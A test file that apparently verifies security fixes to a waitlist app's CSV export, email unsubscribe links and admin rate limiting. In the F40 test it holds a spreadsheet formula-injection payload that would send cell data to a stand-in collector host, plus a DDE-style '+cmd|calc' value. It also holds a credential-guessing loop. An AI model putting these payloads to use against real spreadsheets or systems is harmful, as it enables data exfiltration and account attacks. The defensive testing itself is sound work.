/**
 * close-v1, lane L3: the waitlist admin and mail-link routes.
 *
 *   F40  the admin CSV export wrote a subscriber-supplied value that starts
 *        with `=` as a spreadsheet formula cell
 *        (audit-v1-opus/r2-server/probes/p4-waitlist-csv.probe.test.ts).
 *   F41  the confirmation mail carried two GET links with the SAME token, and
 *        the unsubscribe one deleted the subscriber on GET: a gateway or preview
 *        that follows every link in a mail unsubscribed the reader
 *        (audit-v1-opus/r2-server/probes/p6-waitlist-oneclick.probe.test.ts).
 *   F64  the stats / export credential could be guessed without limit
 *        (audit-v1-opus/r3-server/p2/probe-admin-guessing.summary.log).
 *
 * Run: cd apps/web && npx vitest run __tests__/api/closeV1L3Waitlist.test.ts
 */
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { NextRequest } from 'next/server';

const mem = vi.hoisted(() => ({
  scal: new Map<string, unknown>(),
  sets: new Map<string, Set<string>>(),
  mails: [] as Array<{ to: string; text: string; html: string; headers?: Record<string, string> }>,
  failRecordDelete: false,
  failMail: false,
}));

vi.mock('@/lib/waitlist/store', async (orig) => {
  const fakeKv = {
    async get(k: string) {
      return (mem.scal.get(k) ?? null) as never;
    },
    async set(k: string, v: unknown) {
      mem.scal.set(k, JSON.parse(JSON.stringify(v)));
    },
    async del(k: string) {
      if (mem.failRecordDelete && k.startsWith('wl:sub:')) {
        throw new Error(`ERR refused, command was: ["del","${k}"]`);
      }
      mem.scal.delete(k);
      mem.sets.delete(k);
    },
    async incr(k: string) {
      const n = Number(mem.scal.get(k) ?? 0) + 1;
      mem.scal.set(k, n);
      return n;
    },
    async expire() {},
    async sadd(k: string, m: string) {
      const s = mem.sets.get(k) ?? new Set<string>();
      s.add(m);
      mem.sets.set(k, s);
    },
    async srem(k: string, m: string) {
      mem.sets.get(k)?.delete(m);
    },
    async scard(k: string) {
      return mem.sets.get(k)?.size ?? 0;
    },
    async smembers(k: string) {
      return [...(mem.sets.get(k) ?? [])];
    },
    async mget(keys: string[]) {
      return keys.map(() => null);
    },
  };
  return {
    ...(await orig<typeof import('@/lib/waitlist/store')>()),
    getStore: () => fakeKv,
  };
});

vi.mock('resend', () => ({
  Resend: class {
    emails = {
      send: async (m: { to: string; text: string; html: string; headers?: Record<string, string> }) => {
        if (mem.failMail) return { data: null, error: { name: 'probe', message: 'refused' } };
        mem.mails.push(m);
        return { data: { id: 'x' }, error: null };
      },
    };
  },
}));

import { POST as signup } from '@/app/api/waitlist/route';
import { GET as exportGet } from '@/app/api/waitlist/export/route';
import { GET as statsGet } from '@/app/api/waitlist/stats/route';
import { GET as confirmGet } from '@/app/api/waitlist/confirm/route';
import * as unsubscribeRoute from '@/app/api/waitlist/unsubscribe/route';
import { GET as remindGet } from '@/app/api/waitlist/remind/route';

const STATS_TOKEN = 'probe-stats-token';
const ADMIN = 'test-admin-password';

async function signUp(email: string, ip = '203.0.113.50'): Promise<Response> {
  return signup(
    new NextRequest('https://styx.test/api/waitlist', {
      method: 'POST',
      headers: { 'content-type': 'application/json', 'x-real-ip': ip },
      body: JSON.stringify({ email }),
    } as unknown as ConstructorParameters<typeof NextRequest>[1]),
  );
}

function get(url: string, headers: Record<string, string> = {}): NextRequest {
  return new NextRequest(url, { headers } as unknown as ConstructorParameters<typeof NextRequest>[1]);
}

/** Every waitlist link in every captured mail, text and HTML parts. */
function mailLinks(): string[] {
  const all = mem.mails.map((m) => `${m.text}\n${m.html}`).join('\n');
  return [...new Set(all.match(/https?:\/\/[^\s"<>]+\/api\/waitlist\/[a-z]+\?[^\s"<>]+/g) ?? [])].map((l) =>
    l.replace(/&amp;/g, '&'),
  );
}

function localUrl(link: string): string {
  return link.replace(/^https?:\/\/[^/]+/, 'https://styx.test');
}

beforeEach(() => {
  mem.scal.clear();
  mem.sets.clear();
  mem.mails.length = 0;
  mem.failRecordDelete = false;
  mem.failMail = false;
  vi.unstubAllEnvs();
  vi.stubEnv('RESEND_API_KEY', 're_probe_not_a_real_key');
  vi.stubEnv('WAITLIST_STATS_TOKEN', STATS_TOKEN);
  vi.stubEnv('ADMIN_PASSWORD', ADMIN);
});

describe('F40: the CSV export never hands a spreadsheet a formula', () => {
  it('a value that starts with = + - @ tab or CR is written as text', async () => {
    const payload = '=image("https://collector.invalid/?l="&a2&"@x.io")';
    expect((await signUp('alice@example.com', '203.0.113.1')).status).toBe(200);
    expect((await signUp(payload, '203.0.113.2')).status).toBe(200);
    // Stored fields that are not the email can carry a leading sign too.
    mem.scal.set('wl:sub:bob@example.org', {
      email: 'bob@example.org',
      status: 'confirmed',
      tokenHash: 'f'.repeat(64),
      locale: 'en',
      source: '+cmd|calc',
      createdAt: '@2026-09-01',
      lastSentAt: '2026-09-01T00:00:00.000Z',
      resendCount: 0,
    });
    mem.sets.get('wl:emails')!.add('bob@example.org');

    const res = await exportGet(
      new Request('https://styx.test/api/waitlist/export', { headers: { authorization: `Bearer ${STATS_TOKEN}` } }),
    );
    expect(res.status).toBe(200);
    const csv = await res.text();
    const cells = csv
      .split('\r\n')
      .slice(1)
      .flatMap((row) => row.match(/("([^"]|"")*"|[^,]*)(,|$)/g) ?? [])
      .map((c) => c.replace(/,$/, '').replace(/^"|"$/g, '').replace(/""/g, '"'))
      .filter((c) => c !== '');
    const formulas = cells.filter((c) => /^[=+\-@\t\r]/.test(c));
    expect(formulas, 'a cell the spreadsheet would evaluate').toEqual([]);
    // The value is still there, as text.
    expect(csv).toContain(`'=image(`);
    expect(csv).toContain(`'+cmd|calc`);
    expect(csv).toContain('alice@example.com');
  });
});

describe('F41: following every link in the mail never unsubscribes the reader', () => {
  it('the confirmation and unsubscribe links carry different tokens', async () => {
    await signUp('carol@example.net');
    const links = mailLinks();
    const confirm = links.find((l) => l.includes('/confirm?'));
    const unsub = links.find((l) => l.includes('/unsubscribe?'));
    expect(confirm && unsub).toBeTruthy();
    const tokenOf = (l: string) => new URL(l).searchParams.get('token');
    expect(tokenOf(confirm!)).not.toBe(tokenOf(unsub!));
  });

  it('a GET on every link in the mail leaves the subscriber on the list', async () => {
    await signUp('carol@example.net');
    for (const link of mailLinks()) {
      const route = link.includes('/confirm?') ? confirmGet : unsubscribeRoute.GET;
      const res = await route(get(localUrl(link)));
      expect(res.status).toBeLessThan(500);
    }
    expect(mem.scal.get('wl:sub:carol@example.net'), 'a GET unsubscribed the reader').toBeTruthy();
    expect(mem.sets.get('wl:emails')?.has('carol@example.net')).toBe(true);
  });

  it('the one-click POST (RFC 8058) on the unsubscribe link removes the subscriber', async () => {
    await signUp('dave@example.net');
    const unsub = mailLinks().find((l) => l.includes('/unsubscribe?'))!;
    expect(typeof (unsubscribeRoute as { POST?: unknown }).POST).toBe('function');
    const res = await (unsubscribeRoute as unknown as { POST: (r: NextRequest) => Promise<Response> }).POST(
      new NextRequest(localUrl(unsub), {
        method: 'POST',
        headers: { 'content-type': 'application/x-www-form-urlencoded' },
        body: 'List-Unsubscribe=One-Click',
      } as unknown as ConstructorParameters<typeof NextRequest>[1]),
    );
    expect(res.status).toBeLessThan(400);
    expect(mem.scal.get('wl:sub:dave@example.net')).toBeUndefined();
    expect(mem.sets.get('wl:emails')?.has('dave@example.net') ?? false).toBe(false);
  });

  it('the mail advertises the one-click unsubscribe to the mail client', async () => {
    await signUp('erin@example.net');
    const headers = mem.mails[0]?.headers ?? {};
    expect(headers['List-Unsubscribe']).toMatch(/^<https?:\/\/[^>]+\/api\/waitlist\/unsubscribe\?token=[0-9a-f]{64}[^>]*>$/);
    expect(headers['List-Unsubscribe-Post']).toBe('List-Unsubscribe=One-Click');
  });

  it('a removal whose store write fails logs no address (the deletion moved from GET to POST)', async () => {
    await signUp('gina@example.net');
    const unsub = mailLinks().find((l) => l.includes('/unsubscribe?'))!;
    mem.failRecordDelete = true;
    const logged: string[] = [];
    const capture = (...a: unknown[]) => {
      logged.push(a.map((x) => (x instanceof Error ? `${x.message} ${x.stack}` : String(x))).join(' '));
    };
    const e = vi.spyOn(console, 'error').mockImplementation(capture);
    const w = vi.spyOn(console, 'warn').mockImplementation(capture);
    const res = await (unsubscribeRoute as unknown as { POST: (r: NextRequest) => Promise<Response> }).POST(
      new NextRequest(localUrl(unsub), { method: 'POST' } as unknown as ConstructorParameters<typeof NextRequest>[1]),
    );
    e.mockRestore();
    w.mockRestore();
    expect(res.status).toBe(303);
    expect(res.headers.get('location')).toMatch(/\/waitlist\/invalid$/);
    expect(logged.join(' | '), 'nothing was logged at all').not.toBe('');
    expect(logged.join(' | ')).not.toContain('gina@example.net');
  });

  it('the unsubscribe token does not confirm a pending address', async () => {
    await signUp('frank@example.net');
    const unsub = mailLinks().find((l) => l.includes('/unsubscribe?'))!;
    const token = new URL(unsub).searchParams.get('token')!;
    await confirmGet(get(`https://styx.test/api/waitlist/confirm?token=${token}`));
    expect((mem.scal.get('wl:sub:frank@example.net') as { status: string }).status).toBe('pending');
  });
});

describe('F64: the stats and export credential cannot be guessed without limit', () => {
  it('wrong guesses from one address are cut off, and the right token is then refused too', async () => {
    const statuses: Record<number, number> = {};
    for (let i = 0; i < 40; i++) {
      const res = await statsGet(
        new Request('https://styx.test/api/waitlist/stats', {
          headers: { 'x-admin-password': `guess-${i}`, 'x-real-ip': '198.51.100.7' },
        }),
      );
      statuses[res.status] = (statuses[res.status] ?? 0) + 1;
    }
    expect(statuses[429] ?? 0, JSON.stringify(statuses)).toBeGreaterThan(0);
    const right = await exportGet(
      new Request('https://styx.test/api/waitlist/export', {
        headers: { authorization: `Bearer ${STATS_TOKEN}`, 'x-real-ip': '198.51.100.7' },
      }),
    );
    expect(right.status).toBe(429);
    const other = await statsGet(
      new Request('https://styx.test/api/waitlist/stats', {
        headers: { authorization: `Bearer ${STATS_TOKEN}`, 'x-real-ip': '203.0.113.99' },
      }),
    );
    expect(other.status).toBe(200);
  });
});

/**
 * close-v1 verify r1 (F41 follow-up): the unsubscribe index rows
 * (`wl:tok:<unsubscribe index hash>`, value = the plaintext email) were never
 * deleted, so the address stayed in KV after the person had left
 * (verify-r1/probe-unsub-leftover.log). The rule the unsubscribe route states is
 * "actually delete the record and its indexes"; the remind purge is the same
 * erasure for addresses that never confirmed.
 */
describe('F41 follow-up: once an address is gone, no KV value names it', () => {
  /** Every stored key or value (scalars and sets) that names the address. */
  function rowsNaming(email: string): string[] {
    const out: string[] = [];
    for (const [k, v] of mem.scal) if (k.includes(email) || JSON.stringify(v).includes(email)) out.push(k);
    for (const [k, s] of mem.sets) if (s.has(email)) out.push(`${k} (set)`);
    return out.sort();
  }
  function tokenRowsNaming(email: string): string[] {
    return rowsNaming(email).filter((k) => k.startsWith('wl:tok:'));
  }
  function linkOf(kind: 'confirm' | 'unsubscribe', mailIndex = -1): string {
    const m = mem.mails.at(mailIndex)!;
    const all = `${m.text}\n${m.html}`.replace(/&amp;/g, '&');
    const found = all.match(new RegExp(`https?://[^\\s"<>]+/api/waitlist/${kind}\\?[^\\s"<>]+`));
    return localUrl(found![0]);
  }
  async function postUnsubscribe(url: string): Promise<Response> {
    return (unsubscribeRoute as unknown as { POST: (r: NextRequest) => Promise<Response> }).POST(
      new NextRequest(url, { method: 'POST' } as unknown as ConstructorParameters<typeof NextRequest>[1]),
    );
  }
  function age(email: string, ms: number): void {
    const rec = mem.scal.get(`wl:sub:${email}`) as Record<string, unknown>;
    const at = new Date(Date.now() - ms).toISOString();
    mem.scal.set(`wl:sub:${email}`, { ...rec, createdAt: at, lastSentAt: at });
  }
  async function cron(): Promise<Response> {
    vi.stubEnv('CRON_SECRET', 'probe-cron-secret');
    return remindGet(get('https://styx.test/api/waitlist/remind', { authorization: 'Bearer probe-cron-secret' }));
  }
  const HOUR = 3600_000;

  it("after the one-click unsubscribe (the mail's own unsubscribe token)", async () => {
    await signUp('hana@example.net');
    expect(rowsNaming('hana@example.net').length, 'control: the signup stored the address').toBeGreaterThan(0);
    const res = await postUnsubscribe(linkOf('unsubscribe'));
    expect(res.headers.get('location')).toMatch(/\/waitlist\/removed$/);
    expect(rowsNaming('hana@example.net'), 'rows still holding the email after the unsubscribe').toEqual([]);
  });

  it('after an unsubscribe with the confirmation token (the legacy mail link)', async () => {
    await signUp('ivan@example.net');
    const confirmToken = new URL(linkOf('confirm')).searchParams.get('token')!;
    const res = await postUnsubscribe(`https://styx.test/api/waitlist/unsubscribe?token=${confirmToken}`);
    expect(res.headers.get('location')).toMatch(/\/waitlist\/removed$/);
    expect(rowsNaming('ivan@example.net'), 'rows still holding the email after the unsubscribe').toEqual([]);
  });

  it('a resend rotates the unsubscribe row instead of adding one, and the unsubscribe then leaves nothing', async () => {
    await signUp('jade@example.net');
    age('jade@example.net', 11 * 60_000);
    await signUp('jade@example.net');
    expect(mem.mails.length, 'control: the resend went out').toBe(2);
    expect(tokenRowsNaming('jade@example.net').length, 'index rows naming the address after one resend').toBe(2);
    await postUnsubscribe(linkOf('unsubscribe'));
    expect(rowsNaming('jade@example.net')).toEqual([]);
  });

  it('a reminder rotates the unsubscribe row, and a reminder whose mail fails adds none', async () => {
    await signUp('kira@example.net');
    age('kira@example.net', 25 * HOUR);
    mem.failMail = true;
    const failed = await (await cron()).json();
    expect(failed.mailFailures, 'control: the reminder mail failed').toBe(1);
    expect(tokenRowsNaming('kira@example.net').length, 'index rows after a failed reminder').toBe(2);
    mem.failMail = false;
    const sent = await (await cron()).json();
    expect(sent.reminded, 'control: the reminder went out').toBe(1);
    expect(tokenRowsNaming('kira@example.net').length, 'index rows after the reminder').toBe(2);
    await postUnsubscribe(linkOf('unsubscribe'));
    expect(rowsNaming('kira@example.net')).toEqual([]);
  });

  it('after the purge of an address that never confirmed', async () => {
    await signUp('liam@example.net');
    age('liam@example.net', 31 * 24 * HOUR);
    const out = await (await cron()).json();
    expect(out.purged, 'control: the record was purged').toBe(1);
    expect(rowsNaming('liam@example.net'), 'rows still holding the email after the purge').toEqual([]);
  });
});
